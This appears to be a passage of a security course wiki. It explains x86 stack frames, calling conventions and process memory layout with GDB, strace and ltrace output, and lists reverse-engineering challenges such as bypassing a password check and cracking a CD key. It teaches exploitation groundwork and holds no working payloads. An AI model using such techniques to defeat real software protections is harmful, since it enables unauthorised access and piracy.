</code></pre><p>What we did is we created a breakpoint for the start of the main function and then ran the program. As you can see the first 2 instructions that got executed were <code>push ebp</code> and <code>mov ebp,esp</code>.</p><p>We then set a breakpoint for another function called <code>pass_accepted</code>, continued execution and entered a password that we know is going to pass validation. Once the breakpoint is hit, we can see the same 2 instructions <code>push ebp</code> and <code>mov ebp,esp</code>.</p><p>The two instructions which can be noticed at the beginning of any function are the instructions required for creating the logical container for each function on the stack.</p><p>In essence what they do is save the reference of the old container (<code>push ebp</code>) and record the current address at the top of the stack as the beginning of the new container(<code>mov ebp,esp</code>).</p><p>For a visual explanation please see below:</p><p align=center><img src="https://security.cs.pub.ro/summer-school/wiki/_media/session/s5_frame_pointer_picture.jpg?w=300&tok=e38db5" alt="Sublime's custom image"></p><p>As you can see the EBP register always points to the stack address that corresponds to the beginning of the current function's frame. That is why it is most often referred to as the frame pointer.</p><p>In addition to the two instructions required for creating a new stack frame for a function, there are a couple more instructions that you will usually see at the beginning of a function</p><p>If you analyze the instructions at the beginning of main, you can spot these as being:</p><ol><li><p>An <code>and esp,0xfffffff0</code> instruction.</p></li><li><p>A <code>sub</code> insctruction that subtracts a hex value from ESP.</p></li></ol><p>The first of the two instructions has the purpose of aligning the stack to a specific address boundary. This is done to increase processor efficiency. In our specific case, the top of the stack gets aligned to a 16 byte multiple address.</p><p>One of the purposes of the stack inside functions is that of offering address space in which to place local variables. The second instruction preallocates space for local function variables.</p><p>Let's see how local variables are handled inside assembly code.</p><pre tabindex=0><code class=language-{.code data-lang={.code>#include &lt;stdio.h&gt;
int main()
{
        int a;
        a=1;
        return 0;
}
</code></pre><pre tabindex=0><code class=language-{.code data-lang={.code>kali@kali:~/sss$ gdb test
GNU gdb (Ubuntu/Linaro 7.4-2012.02-0ubuntu2) 7.4-2012.02
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &#34;show copying&#34;
and &#34;show warranty&#34; for details.
This GDB was configured as &#34;i686-linux-gnu&#34;.
For bug reporting instructions, please see:
&lt;http://bugs.launchpad.net/gdb-linaro/&gt;...
Reading symbols from /home/dgioga/sss/test...(no debugging symbols found)...done.
pwndbg&gt;  break main
Breakpoint 1 at 0x80483ba
pwndbg&gt;  run
[----------------------------------registers-----------------------------------]
EAX: 0x1
EBX: 0xb7fc6ff4 --&gt; 0x1a0d7c
ECX: 0xbffff414 --&gt; 0xbffff576 (&#34;/home/dgioga/sss/test&#34;)
EDX: 0xbffff3a4 --&gt; 0xb7fc6ff4 --&gt; 0x1a0d7c
ESI: 0x0
EDI: 0x0
EBP: 0xbffff378 --&gt; 0x0
ESP: 0xbffff368 --&gt; 0x80483d9 (&lt;__libc_csu_init+9&gt;:,add    ebx,0x1c1b)
EIP: 0x80483ba (&lt;main+6&gt;:,mov    DWORD PTR [ebp-0x4],0x1)
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80483b4 &lt;main&gt;:,  push   ebp
   0x80483b5 &lt;main+1&gt;:,mov    ebp,esp
   0x80483b7 &lt;main+3&gt;:,sub    esp,0x10
=&gt; 0x80483ba &lt;main+6&gt;:,mov    DWORD PTR [ebp-0x4],0x1
   0x80483c1 &lt;main+13&gt;:,mov    eax,0x0
   0x80483c6 &lt;main+18&gt;:,leave
   0x80483c7 &lt;main+19&gt;:,ret
   0x80483c8:,nop
[------------------------------------stack-------------------------------------]
0000| 0xbffff368 --&gt; 0x80483d9 (&lt;__libc_csu_init+9&gt;:,add    ebx,0x1c1b)
0004| 0xbffff36c --&gt; 0xb7fc6ff4 --&gt; 0x1a0d7c
0008| 0xbffff370 --&gt; 0x80483d0 (&lt;__libc_csu_init&gt;:,push   ebp)
0012| 0xbffff374 --&gt; 0x0
0016| 0xbffff378 --&gt; 0x0
0020| 0xbffff37c --&gt; 0xb7e3f4d3 (&lt;__libc_start_main+243&gt;:,mov    DWORD PTR [esp],eax)
0024| 0xbffff380 --&gt; 0x1
0028| 0xbffff384 --&gt; 0xbffff414 --&gt; 0xbffff576 (&#34;/home/dgioga/sss/test&#34;)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
 
Breakpoint 1, 0x080483ba in main ()
</code></pre><p>As you can see the operations that relate to the stack are:</p><ol><li><p>The old frame pointer is saved.</p></li><li><p>EBP takes the value of ESP (the frame pointer is set to point to the current function's frame).</p></li><li><p><code>0x10</code> is subtracted from ESP (reserve space for local variables).</p></li><li><p>The value <code>0x01</code> is placed at the address of EBP-0x4 (the local
variable <code>a</code> takes the value 1).</p></li></ol><h4 id=function-parameters>Function parameters</h4><p>The stack is also used to pass in parameters to functions.</p><p>In the process of calling a function we can define two entities. The callee (the function that gets called) and the caller (the function that calls).</p><p>When a function is called, the caller pushes the parameters for the callee on the stack. The parameters are pushed in reverse order.</p><p>When the callee wants to get access to the parameters it was called with, all it needs to do is access the area of the stack that is higher up in reference to the start of it's frame.</p><p>At this point it makes sense to remember the following cases:</p><ol><li><p>When EBP+value is referred to it is generally a referral to a parameter passed in to the current function.</p></li><li><p>When EBP-value is referred to it is generally a referral to a local variable.</p></li></ol><p>Lets see how this happens with the following code:</p><pre tabindex=0><code class=language-{.code data-lang={.code>#include &lt;stdio.h&gt;
 
int add(int a, int b)
{
        int c;
        c=a+b;
        return c;
}
 
int main()
{
        add(10,3);
        return 0;
}
</code></pre><pre tabindex=0><code class=language-{.code data-lang={.code>pwndbg&gt; pdis 0x080483ca
Dump of assembler code for function main:
   0x080483ca &lt;+0&gt;:,push   ebp                        #save the old frame pointer
   0x080483cb &lt;+1&gt;:,mov    ebp,esp                    #create the new frame pointer
   0x080483cd &lt;+3&gt;:,sub    esp,0x8                    #create space for local variables
   0x080483d0 &lt;+6&gt;:,mov    DWORD PTR [esp+0x4],0x3    #push the last parameter of the function that is to be called
   0x080483d8 &lt;+14&gt;:,mov    DWORD PTR [esp],0xa      #push the second to last(the first in this case) parameter of the function that is to be called
   0x080483df &lt;+21&gt;:,call   0x80483b4 &lt;add&gt;          #call the function
   0x080483e4 &lt;+26&gt;:,mov    eax,0x0
   0x080483e9 &lt;+31&gt;:,leave
   0x080483ea &lt;+32&gt;:,ret
End of assembler dump.
pwndbg&gt; pdis 0x080483b4
Dump of assembler code for function add:
   0x080483b4 &lt;+0&gt;:,push   ebp                        #save the old frame pointer
   0x080483b5 &lt;+1&gt;:,mov    ebp,esp                    #create a new frame pointer
   0x080483b7 &lt;+3&gt;:,sub    esp,0x10                   #create space for local variables
   0x080483ba &lt;+6&gt;:,mov    eax,DWORD PTR [ebp+0xc]    #move the first parameter into the EAX register (ebp+saved_ebp(4 bytes)+return_addres(4 bytes)+last_parameter(4 bytes))
   0x080483bd &lt;+9&gt;:,mov    edx,DWORD PTR [ebp+0x8]    #move the second parameter into the EDX register (ebp+saved_ebp(4 bytes)+return_addres(4 bytes))
   0x080483c0 &lt;+12&gt;:,add    eax,edx                  #add the registers
   0x080483c2 &lt;+14&gt;:,mov    DWORD PTR [ebp-0x4],eax  #place the result inside the local variable (c)
   0x080483c5 &lt;+17&gt;:,mov    eax,DWORD PTR [ebp-0x4]  #place the result inside the eax register in order to return it
   0x080483c8 &lt;+20&gt;:,leave
   0x080483c9 &lt;+21&gt;:,ret
End of assembler dump.
</code></pre><p>As you can see the parameters were pushed in reverse order, and the rule regarding the reference to EBP holds.</p><p>If you don't understand why the offset for the parameters starts at EBP+0x08 and not EBP follow through with the next section.</p><h4 id=calling-functions-call-and-ret>Calling functions (call and ret)</h4><p>When calling a function the callee places the return address on the stack. This address is nothing more than a bookmark so that execution can resume where it left off once the called function finishes
execution.</p><p>The last instruction in functions is usually a <code>ret</code> instruction that resumes execution to the callee.</p><p>For a better understanding of function calling and returning, from an execution flow point of view, please follow through with the following tip.</p><p><span style=font-size:1rem;background:lightgrey>The call instruction could be translated to the following instructions:</span></p><ol><li><code>push eip</code></li><li><code>mov eip, address_of_called_function</code></li></ol><p>The ret instruction could be translated into:</p><ol><li><code>pop eip</code></li></ol><p>The visual depiction of how the stack looks while a program is executing
can be found in section 2 but will be included here as well:</p><p align=center><img src="https://security.cs.pub.ro/summer-school/wiki/_media/session/stack-convention.png?w=600&tok=d710e1"></p><h3 id=next-lesson-preview-buffer-overflows>Next lesson preview: Buffer Overflows</h3><p>Now that we have a complete overview of the stack we can step forward to stack based buffer overflows.</p><p>A buffer overflow takes place when there is a lack of checking regarding boundaries and usually result in complete control of the program's instruction pointer. This takes place when a buffer overflows its boundaries and overwrites the return address of a function.</p><p>A typical example of buffer overflows can be seen in the following picture:</p><p align=center><img src="https://security.cs.pub.ro/summer-school/wiki/_media/session/s5_buffer_overflow.jpg?w=500&tok=810778"></p><h2 id=challenges>Challenges</h2><p>Use GDB and pwndbg to run the code provided in the Activities section.</p><h3 id=01-challenge---explore-the-simple-password-protected-bash>01. Challenge - Explore The Simple Password Protected Bash</h3><p>The executable gets input from the user and evaluates it against a static condition. If it succeeds it then calls a <code>password_accepted</code> function that prints out a success message and spawns a shell.</p><p>Your task is to use GDB and pwndbg to force the executable to call the <code>password_accepted</code> function.</p><p>Gather as much info about the executable as possible through the techniques you have learned in previous sessions.</p><p>Think of modifying registers for forcing the executable to call thefunction (there is more than one way of doing this).</p><h3 id=02-challenge---simple-password-protected-bash-destruction>02. Challenge - Simple Password Protected Bash Destruction</h3><p>What is the condition against which your input is evaluated in the executable contained in the executable <code>sppb</code>?</p><p><span style=font-size:1rem;background:lightgrey>The ultimate goal is to be able to craft an input for the binary so that
the <code>password_accepted</code> function is called (modifying registers while
running the program in GDB is just for training purposes).</span></p><h3 id=03-challenge---domino>03. Challenge - Domino</h3><p>Analyze the binary, reverse engineer what it does and get a nice message
back.</p><h3 id=04-challenge---call-me>04. Challenge - Call me</h3><p>Investigate the binary in <code>04-challenge-call-me/src/call_me</code> and find
out the flag</p><details><summary>Hint</summary>
There is something hidden you can toy around with.</details>
<details><summary>Hint</summary>
The challenge name is a hint.</details><h3 id=05-challenge---snooze-me>05. Challenge - Snooze Me</h3><p>I wrote a simple binary that computes the answer to life, the universe and everything. It swear it works&mldr; eventually.</p><h3 id=06-challenge---phone-home>06. Challenge - Phone Home</h3><p>To protect their confidential data from those snooping cloud providers, the authors of <code>06-challenge-phone-home/src/phone_home</code> have used some obfuscation techniques.</p><p>Unfortunately, the key feature of the application is now unreachable due to a bug. Can you bypass the impossible condition?</p><h3 id=07-challenge---chain-encoder>07. Challenge - Chain encoder</h3><p>How do you reverse something made to be ireversible, you are welcome to find out in this challenge.</p><h3 id=08-challenge---simple-cdkey>08. Challenge - Simple cdkey</h3><p>I found this software but i don&rsquo;t have the cd key, can you crack it for me?</p><hr><p>Except where otherwise noted, content on this wiki is licensed under the
following license: <a href=https://creativecommons.org/licenses/by-sa/4.0/deed.en>CC Attribution-Share Alike 4.0 International</a></p></div><div class=td-content style=page-break-before:always><h1 id=pg-44302718167d06aedc351da9619553bc>4 -</h1><h1 id=executables-and-processes>Executables and Processes</h1><p>From a user&rsquo;s perspective, the main purpose of the computing system is to run applications.
Applications are used for the user&rsquo;s benefit: listen to music, organize files, play games, develop applications, chat over the Internet, etc.</p><p>A running application is called <strong>a process</strong>.
A user starts a process, interacts with a process, ends a process.</p><p>When a process runs for the benefit of the user, it <strong>executes instructions</strong> that <strong>operate on data</strong>.
These two items (executing instructions and operating on data) are the most relevant items to understanding processes and executables.
Instructions, also called <strong>code</strong>, and <strong>data</strong> reside in memory.
Code is read from memory by the processor / CPU (<em>Central Processing Unit</em>), then it is decoded and interpreted by the CPU, then it is executed on data that is also read from memory by the CPU.
Finally, the result of the operation is stored back into memory.
So, each process has its memory space that stores code and data.</p><p>TODO: diagram with memory (code, data) and CPU interaction</p><p>We say that each process has its own memory space, also called address space.
We refer to this as <strong>process address space</strong>, or <strong>process virtual address space</strong> ((P)VAS) (why this is named <em>virtual</em> is outside the scope of this section).
This space is populated with data and code.
Data is dynamic with respect to contents and size: it can be modified, it can be enlarged or shrinked.
Code is static: it can&rsquo;t be (easily) modified, it can&rsquo;t be (easily) enlarged.
Data can be read from or written to outside the process memory, to outside devices (I/O - <em>Input/Output</em>) - keyboard, monitor, network, disk.
Code is however read at process birth time.</p><p>The origin of the code and some parts of the data is <strong>the application executable</strong> (or program executable).
The application executable is a binary file with a given format that stores the code and initial data that will be used to set up the process.
The birth of a process means loading the code and initial data from the program executable into memory.
This creates the process virtual address space.
Then the CPU is pointed to execute instructions from the new process virtual address spaces and now the process is running.</p><p>TODO: diagram with executable (code, data) and process memory (code, data) + CPU (code + data interaction) + I/O (for parts of data)</p><p>We call the starting of a process from a program executable <strong>loading</strong>.
The <strong>loader</strong> is the piece of software responsible for this.
Whatever happens during loading is said to happen during <strong>load-time</strong>.
After the process starts, whatever happens is said to happen at / during <strong>runtime</strong>.</p><p>For this session we will first look at the process virtual address space and see how it is updated at runtime.
We will then map that information to the program executable and what&rsquo;s hapenning at load-time.
We will then spend more time dissecting and executable and make the first steps on static analysis, the subject of the <a href=https://github.com/razvand/binary/tree/master/sessions/static-analysis>next section</a>.</p><h2 id=process-memory-layout>Process Memory Layout</h2><p>To understand the full picture of program execution it is vital to understand the memory layout of processes from ELF executables.
The kernel provides an interface in <code>/proc/&lt;PID>/maps</code> for each process to see how the memory layout looks like.</p><p>Let&rsquo;s write a simple Hello World application and investigate.</p><p><strong>IMPORTANT:</strong> Note that we have removed <strong>Address Space Layout Randomization</strong> for these examples.
We&rsquo;ll explain this later.</p><pre tabindex=0><code>#include &lt;stdio.h&gt;
int main()
{
	printf(&#34;Hello world\n&#34;);
	malloc(10000);
	while(1){
		;
	}
	return 0;
}
</code></pre><pre tabindex=0><code>$ gcc -Wall hw.c -o hw -m32
$ ./hw  &amp;
[1] 4771
Hello world
$ cat /proc/4771/maps
08048000-08049000 r-xp 00000000 08:06 1843771                            /tmp/hw
08049000-0804a000 r--p 00000000 08:06 1843771                            /tmp/hw
0804a000-0804b000 rw-p 00001000 08:06 1843771                            /tmp/hw
0804b000-0806e000 rw-p 00000000 00:00 0                                  [heap]
f7ded000-f7dee000 rw-p 00000000 00:00 0
f7dee000-f7f93000 r-xp 00000000 08:06 917808                             /lib32/libc-2.17.so
f7f93000-f7f95000 r--p 001a5000 08:06 917808                             /lib32/libc-2.17.so
f7f95000-f7f96000 rw-p 001a7000 08:06 917808                             /lib32/libc-2.17.so
f7f96000-f7f99000 rw-p 00000000 00:00 0
f7fd9000-f7fdb000 rw-p 00000000 00:00 0
f7fdb000-f7fdc000 r-xp 00000000 00:00 0                                  [vdso]
f7fdc000-f7ffc000 r-xp 00000000 08:06 917869                             /lib32/ld-2.17.so
f7ffc000-f7ffd000 r--p 0001f000 08:06 917869                             /lib32/ld-2.17.so
f7ffd000-f7ffe000 rw-p 00020000 08:06 917869                             /lib32/ld-2.17.so
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
</code></pre><p>If we start another process in the background the output for it will be exactly the same as this one.
Why is that? The answer, of course, is virtual memory.
The kernel provides this mechanism through which each process has an address space <strong>completely isolated</strong> from that of other running processes.
They can still communicate using inter-process communication mechanisms provided by the kernel but we won&rsquo;t get into that here.
Shortly put, there would be two processes with the same name and with two <strong>apparently</strong> identical mappings, but still the two programs would be isolated from one another.</p><p>An initial schematic of the memory layout would be the following:</p><p><img src=assets/elf-space.png alt="ELF Memory Layout"></p><h3 id=executable>Executable</h3><p>As we have seen, there are three memory regions associated with the executable:</p><pre tabindex=0><code>08048000-08049000 r-xp 00000000 08:06 1843771                            /tmp/hw
08049000-0804a000 r--p 00000000 08:06 1843771                            /tmp/hw
0804a000-0804b000 rw-p 00001000 08:06 1843771                            /tmp/hw
</code></pre><p>From their permissions we can infer what they correspond to:</p><ul><li><code>08048000-08049000 r-xp</code> is the <code>.text</code> section along with the rest of the executable parts</li><li><code>08049000-0804a000 r–p</code> is the <code>.rodata</code> section</li><li><code>0804a000-0804b000 rw-p</code> consists of the <code>.data</code>, <code>.bss</code> sections and other R/W sections</li></ul><p>It is interesting to note that the executable is almost identically mapped into memory.
The only region that is <em>compressed</em> in the binary is the <code>.bss</code> section.
Let&rsquo;s see this in action by dumping the header of the file:</p><pre tabindex=0><code>$ hexdump -Cv hw | head
00000000  7f 45 4c 46 01 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|
00000010  02 00 03 00 01 00 00 00  b0 83 04 08 34 00 00 00  |............4...|
00000020  78 11 00 00 00 00 00 00  34 00 20 00 0a 00 28 00  |x.......4. ...(.|
00000030  1e 00 1b 00 06 00 00 00  34 00 00 00 34 80 04 08  |........4...4...|
00000040  34 80 04 08 40 01 00 00  40 01 00 00 05 00 00 00  |4...@...@.......|
00000050  04 00 00 00 03 00 00 00  74 01 00 00 74 81 04 08  |........t...t...|
00000060  74 81 04 08 13 00 00 00  13 00 00 00 04 00 00 00  |t...............|
00000070  01 00 00 00 01 00 00 00  00 00 00 00 00 80 04 08  |................|
00000080  00 80 04 08 6c 06 00 00  6c 06 00 00 05 00 00 00  |....l...l.......|
00000090  00 10 00 00 01 00 00 00  00 0f 00 00 00 9f 04 08  |................|
$ gdb ./hw
...........
gdb-peda$ hexdump 0x08048000 /10
0x08048000 : 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00   .ELF............
0x08048010 : 02 00 03 00 01 00 00 00 b0 83 04 08 34 00 00 00   ............4...
0x08048020 : 78 11 00 00 00 00 00 00 34 00 20 00 0a 00 28 00   x.......4. ...(.
0x08048030 : 1e 00 1b 00 06 00 00 00 34 00 00 00 34 80 04 08   ........4...4...
0x08048040 : 34 80 04 08 40 01 00 00 40 01 00 00 05 00 00 00   4...@...@.......
0x08048050 : 04 00 00 00 03 00 00 00 74 01 00 00 74 81 04 08   ........t...t...
0x08048060 : 74 81 04 08 13 00 00 00 13 00 00 00 04 00 00 00   t...............
0x08048070 : 01 00 00 00 01 00 00 00 00 00 00 00 00 80 04 08   ................
0x08048080 : 00 80 04 08 6c 06 00 00 6c 06 00 00 05 00 00 00   ....l...l.......
0x08048090 : 00 10 00 00 01 00 00 00 00 0f 00 00 00 9f 04 08   ................
</code></pre><h3 id=heap>Heap</h3><p>The heap comes right after the executable at <code>0x0804b000</code> and ends at <code>0x0806e000</code> which is the current <code>brk</code> point.
The memory allocator will increase the <code>brk</code> when more allocations are made but will not decrease it when memory is freed so as to reuse the memory regions for future allocations.
The allocator in libc actually keeps a list of past allocations and their sizes.
When future allocations will require the same size as a previously freed region, the allocator will reuse one from this lookup table.
The process is called <strong>binning</strong>.</p><p>Let&rsquo;s see how the brk evolves in our executable using strace:</p><pre tabindex=0><code>$ strace -i -e brk ./hw
[ Process PID=1995 runs in 32 bit mode. ]
[f7ff2314] brk(0)                       = 0x804b000
Hello world
[f7fdb430] brk(0)                       = 0x804b000
[f7fdb430] brk(0x806e000)               = 0x806e000
</code></pre><p>Let&rsquo;s test the fact that the <code>brk</code> does not decrease and that future malloc&rsquo;s can reuse previously freed regions:</p><pre tabindex=0><code>#include &lt;stdio.h&gt;
int main()
{
	void * buf[15];
	int i;
	for( i = 0 ; i &lt; 15; i++)
		buf[i] = malloc( i * 100) ;

	for( i = 0 ; i &lt; 15; i++)
		free( buf[i] );

	for( i = 0 ; i &lt; 15; i++)
		buf[i] = malloc( i * 100) ;


	return 0;
}
</code></pre><pre tabindex=0><code>$ strace -e brk ./hw
[ Process PID=2424 runs in 32 bit mode. ]
brk(0)                              = 0x804b000
brk(0)                              = 0x804b000
brk(0x806c000)                      = 0x806c000
+++ exited with 0 +++
$ ltrace -e malloc ./hw
hw-&gt;malloc(0)                       = 0x804b008
hw-&gt;malloc(100)                     = 0x804b018
hw-&gt;malloc(200)                     = 0x804b080
hw-&gt;malloc(300)                     = 0x804b150
hw-&gt;malloc(400)                     = 0x804b280
hw-&gt;malloc(500)                     = 0x804b418
hw-&gt;malloc(600)                     = 0x804b610
hw-&gt;malloc(700)                     = 0x804b870
hw-&gt;malloc(800)                     = 0x804bb30
hw-&gt;malloc(900)                     = 0x804be58
hw-&gt;malloc(1000)                    = 0x804c1e0
hw-&gt;malloc(1100)                    = 0x804c5d0
hw-&gt;malloc(1200)                    = 0x804ca20
hw-&gt;malloc(1300)                    = 0x804ced8
hw-&gt;malloc(1400)                    = 0x804d3f0

hw-&gt;malloc(0)                       = 0x804b008
hw-&gt;malloc(100)                     = 0x804b018
hw-&gt;malloc(200)                     = 0x804b080
hw-&gt;malloc(300)                     = 0x804b150
hw-&gt;malloc(400)                     = 0x804b280
hw-&gt;malloc(500)                     = 0x804b418
hw-&gt;malloc(600)                     = 0x804b610
hw-&gt;malloc(700)                     = 0x804b870
hw-&gt;malloc(800)                     = 0x804bb30
hw-&gt;malloc(900)                     = 0x804be58
hw-&gt;malloc(1000)                    = 0x804c1e0
hw-&gt;malloc(1100)                    = 0x804c5d0
hw-&gt;malloc(1200)                    = 0x804ca20
hw-&gt;malloc(1300)                    = 0x804ced8
hw-&gt;malloc(1400)                    = 0x804d3f0
+++ exited (status 0) +++
</code></pre><p>As you can see, only one <code>brk</code> call is made.
Furthermore, after the regions are freed they are reused.</p><p><strong>IMPORTANT:</strong> This behaviour of the allocator is important in the <strong>Use After Free</strong> class of vulnerabilities which we will be covering in the next labs.</p><h3 id=memory-mappings-and-libraries>Memory Mappings and Libraries</h3><p>In our example we had the following memory mappings:</p><pre tabindex=0><code>f7ded000-f7dee000 rw-p 00000000 00:00 0
f7dee000-f7f93000 r-xp 00000000 08:06 917808                             /lib32/libc-2.17.so
f7f93000-f7f95000 r--p 001a5000 08:06 917808                             /lib32/libc-2.17.so
f7f95000-f7f96000 rw-p 001a7000 08:06 917808                             /lib32/libc-2.17.so
f7f96000-f7f99000 rw-p 00000000 00:00 0
f7fd9000-f7fdb000 rw-p 00000000 00:00 0
f7fdb000-f7fdc000 r-xp 00000000 00:00 0                                  [vdso]
f7fdc000-f7ffc000 r-xp 00000000 08:06 917869                             /lib32/ld-2.17.so
f7ffc000-f7ffd000 r--p 0001f000 08:06 917869                             /lib32/ld-2.17.so
f7ffd000-f7ffe000 rw-p 00020000 08:06 917869                             /lib32/ld-2.17.so
</code></pre><p>All functions that are called from external libraries <em>pull</em> in the whole library into the address space.
As these are also ELF files you can see that they have similar patterns: multiple sections with different permissions just like the main executable.</p><p>One more thing to note here is that large calls to <code>malloc</code> result in calls to <code>mmap2</code>:</p><pre tabindex=0><code>#include &lt;stdio.h&gt;
int main()
{
	printf(&#34;Hello world\n&#34;);
	printf(&#34;Small allocation %p\n&#34;, malloc(10000));
	printf(&#34;Big allocation %p\n&#34;, malloc(10000000));
	return 0;
}
</code></pre><pre tabindex=0><code># strace -e brk,mmap2  ./hw_large
[ Process PID=3445 runs in 32 bit mode. ]
brk(0)                                  = 0x804b000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fda000
mmap2(NULL, 265183, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffffffff7f99000
mmap2(NULL, 1747628, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffffffff7dee000
mmap2(0xf7f93000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a5000) = 0xfffffffff7f93000
mmap2(0xf7f96000, 10924, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7f96000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7ded000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd9000
Hello world
brk(0)                                  = 0x804b000
brk(0x806e000)                          = 0x806e000
Small allocation 0x804b008
mmap2(NULL, 10002432, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7463000
Big allocation 0xf7463008
</code></pre><p>As expected, the <code>brk</code> is increased when the first allocation is made.
However, larger regions are backed by memory mappings.</p><h3 id=stack>Stack</h3><p>If you observed from previous traces, the <code>mmap2</code> call returns addresses towards NULL (lower addresses).
It behaves like this because there is another important memory region called the <code>stack</code> that has a fixed size: usually 8 MB.
Since the heap and the mmap region do not have this limit imposed the optimization is to start mmap-ings from a known boundary: the stack end boundary.
Let&rsquo;s put this into perspective.
You can view the current stack limit using <code>ulimit -s</code>.</p><pre tabindex=0><code>$ ulimit -s
8192
$ python
&gt;&gt;&gt; hex(0xffffffff - 8192*1024)
&#39;0xff7fffff&#39;
</code></pre><p>This address is the stack boundary.
It seems odd then that the first mmap in the program above ends at <code>0xf7ffe000</code> and not <code>0xff7fffff</code>.
This is probably an optimization.</p><p>However, we can set the stack size to unlimited and the mmap allocation direction will reverse:</p><pre tabindex=0><code>$ ulimit -s unlimited
$ strace -e mmap2,brk ./hw_large
[ Process PID=4617 runs in 32 bit mode. ]
brk(0)                                  = 0x804b000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x55578000
mmap2(NULL, 265183, PROT_READ, MAP_PRIVATE, 3, 0) = 0x55579000
mmap2(NULL, 1747628, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x555ba000
mmap2(0x5575f000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a5000) = 0x5575f000
mmap2(0x55762000, 10924, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x55762000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x55765000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x55579000
Hello world
brk(0)                                  = 0x804b000
brk(0x806e000)                          = 0x806e000
Small allocation 0x804b008
mmap2(NULL, 10002432, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x55766000
Big allocation 0x55766008
^Z
[1]+  Stopped                 strace -e mmap2,brk ./hw_large


$ cat /proc/4617/maps
08048000-08049000 r-xp 00000000 08:06 1843771                            /tmp/hw_large
08049000-0804a000 r--p 00000000 08:06 1843771                            /tmp/hw_large
0804a000-0804b000 rw-p 00001000 08:06 1843771                            /tmp/hw_large
0804b000-0806e000 rw-p 00000000 00:00 0                                  [heap]
55555000-55575000 r-xp 00000000 08:06 917869                             /lib32/ld-2.17.so
55575000-55576000 r--p 0001f000 08:06 917869                             /lib32/ld-2.17.so
55576000-55577000 rw-p 00020000 08:06 917869                             /lib32/ld-2.17.so
55577000-55578000 r-xp 00000000 00:00 0                                  [vdso]
55578000-5557a000 rw-p 00000000 00:00 0
555ba000-5575f000 r-xp 00000000 08:06 917808                             /lib32/libc-2.17.so
5575f000-55761000 r--p 001a5000 08:06 917808                             /lib32/libc-2.17.so
55761000-55762000 rw-p 001a7000 08:06 917808                             /lib32/libc-2.17.so
55762000-560f0000 rw-p 00000000 00:00 0
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
</code></pre><p>As you can see, the big allocation is now towards the stack instead of towards the heap.</p><p>Returning to the main functionality of the stack, remember from the previous lab that local variables are declared on the stack.
This translates into assembly code in the following way:</p><pre tabindex=0><code>int main()
{

        char buf[1000];
        int i;
............
}
</code></pre><p>The C snippet would be translated into ASM something like:</p><pre tabindex=0><code>0804840c &lt;main&gt;:
 804840c:	55                   	push   ebp
 804840d:	89 e5                	mov    ebp,esp
 804840f:	81 ec f0 03 00 00    	sub    esp,0x3f0
..........
</code></pre><p>The <code>0x3f0</code> hex value is equal to <code>1008</code> in decimal, which is precisely 1000 (from <code>buf</code>) + 4 (from <code>i</code>) + 4 (the storage of another int that the compiler used later in the code).</p><p>As the program subtracts more from <code>esp</code> the kernel will provide pages on-demand until the stack boundary or another mmap-ing is hit.
The kernel will, in this case, kill the application because of the Segmentation Fault.</p><h3 id=segmentation-fault>Segmentation Fault</h3><p>Now that we know everything about the memory address space we can say more about the infamous <code>Segmentation Fault</code> that all of us have, at some time, encountered.
It is basically a permission violation.
Apart from the mappings that appear in <code>/proc/&lt;PID>/maps</code> with <code>r--</code>, <code>rw-</code>, etc, you can consider that everything else is <code>---</code>.
Thus, a read access at such a location will violate the permission of that region so the whole app will be killed by the signal received (unless it has a signal handler).
Examples:</p><ul><li>Dereferencing a <code>NULL</code> pointer will try to read from <code>0x00000000</code> which is not (usually) mapped => <code>SIGSEGV</code> (read access on none)</li><li>Writing after the end of a heap buffer (if the heap buffer is exactly at the end of a mapping) will determine writes into unmapped pages => SIGSEGV (write access on none)</li><li>Trying to write to <code>.rodata</code> => SIGSEGV (write access on read only)</li><li>Overwriting the stack with &ldquo;AAAAAAAAAAAAAAAAAAA&rdquo; will also overwrite the return address and make the execution go to <code>0x41414141</code> => SIGSEGV (execute access on none)</li><li>Overwriting the stack and return address with another address to a shellcode on the stack => SIGSEGV (execute access on read/write only)</li><li>Trying to rewrite the binary (<code>int *v = main; *v = 0x90909090;</code>) => SIGSEGV (write access on read/execute only)</li></ul><h2 id=tutorials>Tutorials</h2><p>This session is focused on the transformation of an <strong>ELF file</strong> (stored on disk) as it is loaded into memory and becomes <strong>a process</strong> (stored into memory).
